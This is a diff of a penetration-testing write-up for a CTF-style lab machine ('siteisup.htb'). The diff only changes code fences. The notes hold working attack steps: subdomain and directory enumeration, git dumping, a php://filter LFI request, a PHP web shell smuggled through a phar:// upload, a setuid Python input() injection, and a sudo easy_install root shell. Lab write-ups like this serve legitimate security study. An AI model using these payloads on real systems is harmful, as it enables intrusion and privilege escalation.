@@ -1,7 +1,7 @@
 ## Reconnaissance
 ## Nmap Enumeration
 - Passing command :
-	```bash
+	```
 nmap -sV -sC -vv 10.10.11.177
 
 ---MAIN-OUTPUT---
@@ -37,20 +37,20 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 - **ffuf subdirectory search reveals dev**
 	- **NOTE: adding the domain name to /etc/hosts is IMPORTANT for this to work.**
 	- we filter out size (1131) as we get a response for everything
-		```bash
+		```
 ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://10.10.11.176/ -H 'Host: FUZZ.10.10.11.176' -fs 1131
 ```
 		- We find dev.siteisup.htb which when trying to access leads to a **Forbidden** page.
 - **dirbuster** reveals 
 	- /dev/index.php which is also blank
 - We once again enumerate gobuster with dev included:
-	```bash
+	```
 gobuster dir -u http://siteisup.htb/dev/ dns --wordlist /usr/share/wordlists/dirb/common.txt
 ```
 	- common.txt worked better than big.txt here
 	- **We find a git repo**
 - We dump git using git-dumper:
-	```bash
+	```
 git-dumper http://siteisup.htb/dev/ updown_repo
 cd updown_repo
 git log
@@ -62,7 +62,7 @@ git show <commit_id>
 		- **New technique in header to protect our dev vhost**
 	- **NOTE : With git you can add `-p` to `git log` to see all changes with each commit. For smaller changes it's very easy to look through changes for a repo. Additionally you can do `git log –p -- some/path-or-file.php` to show only the log (and changes) for certain directories or files :)**
 - We see index.php
-	```bash
+	```
 <b>This is only for developers</b>
 <br>
 <a href="?page=admin">Admin Panel</a>
@@ -84,20 +84,20 @@ git show <commit_id>
 		- then it does an include (appends) .php onto the page variable
 		- Else it includes **checker.php** which is the website we have access to.
 	- **NOTE : Also has an LFI vulnerability due to :**
-		```bash
+		```
 include($_GET['page'] . ".php");
 ```
 		- **Will explore this method in the end (Based of IPPSec's video. For now, to test:** 
 			- capture home dev.siteisup.htb in Burpsuite
 			- Add the special header
 			- add this in the as the GET command in the packet
-			```bash
+			```
 GET /?page=php://filter/convert.base64-encode/resource=index HTTP/1.1
 ```
 			- It should add .php to index
 			- wew are returned with base64 data of admin panel page (dex.siteisup.htb)
 - On seeing checker.php which is called by index.php we find there is a check for file type before uploading:
-	```bash
+	```
 # Check if extension is allowed.
         $ext = getExtension($file);
         if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
@@ -108,7 +108,7 @@ GET /?page=php://filter/convert.base64-encode/resource=index HTTP/1.1
 	- There exists a phar:// wrapper which can be used to read compressed php file
 		- phar is a package format for bundled php files
 - We also see a hidden `.htaccess` fiile:
-	```bash
+	```
 SetEnvIfNoCase Special-Dev "only4dev" Required-Header
 Order Deny,Allow
 Deny from All
@@ -128,11 +128,11 @@ Allow from env=Required-Header
 	- tried to upload .php.png to the file and it uploaded but we couldn't read it
 		- this is where the phar wrapper comes in as it can read compressed php files
 - We try a basic php script and save it to a file called info.php :
-	```bash
+	```
 <?php system($_REQUEST['cmd']); ?>
 ```
 - We compress the file with zip and name it a filename that is allowed (txt, jpeg etc)
-	```bash
+	```
 zip info.zip info.php
 mv info.zip info.txt
 
@@ -147,13 +147,13 @@ zip info.txt info.php
 -------
 ## Successful test
 - We create another basic script using another command without the system command (assuming it could be blocked)
-	```bash
+	```
 <?php phpinfo();?>
 ```
 	- perform the same steps above
 	- it does lead us to the php info page
 - In the phpinfo() page we search for the disable_functions and copy all the disabled functions. (can see output of the data at the bottom of these notes)
-	```bash
+	```
 vi diablefunction
 ------
 Paste disable_functions
@@ -182,7 +182,7 @@ foreach ($dangerousfunctions as $function){
 		- We zip it and upload the file and access it like before:
 			http://dev.siteisup.htb/?page=phar://uploads/c6092d5571f3dc4727d5cb0b3409e164/dangerous.txt/dangerous
 		- We get an output:
-			```bash
+			```
 proc_openis enabled.
 ```
 - Add this to dangerous2.php (consider using github autopilot on VScode to help build code but can also find syntax via : https://stackoverflow.com/questions/6014819/how-to-get-output-of-proc-open from searching "proc_open php in google)
@@ -202,7 +202,7 @@ $process = proc_open ($cmd, $desriptorspec, $pipes);
 ## Lateral Movement
 - Looking around we find we can access /home/developer to find an ELF file and a python test file
 	- on reading the test file we see two interesting things :
-		```bash
+		```
 import requests
 
 url = input("Enter URL here:")
@@ -215,14 +215,14 @@ else:
 		- There is a space between the print and " so this is python2
 		- **input** can lead to command execution (should use raw input instead as a fix)
 - check is setuid permissions is in the ELF executable 
-	```bash
+	```
 stat siteisup
 ```
 	- Shows **4**750 so since 4 is there setuid permissions have been set.
 		- Setuid allows us to execute as owner which is developer for this file
 - Execute siteisup
 	- enter a python command injection
-		```bash
+		```
 ./siteisup
 
 ---INPUT---
@@ -232,7 +232,7 @@ __import__('os').system("/bin/bash")
 	- But we can't read user.txt! Why?
 		- because setuid set us as developer user but we are still www-data in groups and as you see the details of user.txt the owner is root and group is developer
 	- ssh into it. (copy ssh private key to local machine)
-		```bash
+		```
 ssh -i developer@siteisup.htb
 ```
 	- we read user.txt
@@ -240,7 +240,7 @@ ssh -i developer@siteisup.htb
 - **sudo -l reveals a /usr/local/bin/easy_install**
 	- GTFOBins shows a set of commands to execute if we have sudo privileges for easy_install
 		- we pass the commands (simply copy pasted, tried to echo the command directly but didn't work)
-			```bash
+			```
 TF=$(mktemp -d)
 echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
 sudo easy_install $TF
@@ -256,7 +256,7 @@ sudo easy_install $TF
 			- https://github.com/synacktiv/php_filter_chain_generator
 - the php://temp at the end of the output which we add to our packet always returns something no matter what you append to it  (only temp works)
 - we execute the python script with the command
-	```bash
+	```
 python3 php_filter_chain_generator.py --chain <?php phpinfo(); ?> lfitest.txt
 ```
 	- Copy the text and add it to the GET header when we capture dev.siteisup.htb packet in Burp Suite
